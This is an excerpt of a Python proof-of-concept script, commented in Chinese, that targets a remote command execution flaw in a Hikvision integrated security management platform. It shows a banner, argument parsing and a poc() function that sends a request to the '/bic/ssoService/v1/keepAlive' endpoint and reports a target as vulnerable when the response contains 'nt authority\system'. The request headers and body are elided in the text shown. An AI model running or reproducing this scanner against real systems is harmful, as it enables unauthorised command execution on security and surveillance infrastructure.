...
╚███╔███╔╝██║  ██║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║███████╗███████╗╚██████╔╝██║ ╚████║
 ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝                                                                                       
                                      ...
                                      version:Hikvision海康综合安防管理平台远程命令执行漏洞 
"""
    print(banner)
...
def main():
    ...
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="Hikvision海康综合安防管理平台远程命令执行漏洞 ")
...
#定义poc
def poc(target):
    payload = '/bic/ssoService/v1/keepAlive'
    url = target+payload
    headers = {
...
'''
    ...
    try:
        ...
        # print(re.text)
        if re.status_code == 200 and "nt authority\system" in re.text:
            # print("200啦")
            print(f'[+++]该{target}存在Hikvision海康综合安防管理平台远程命令执行漏洞 ')
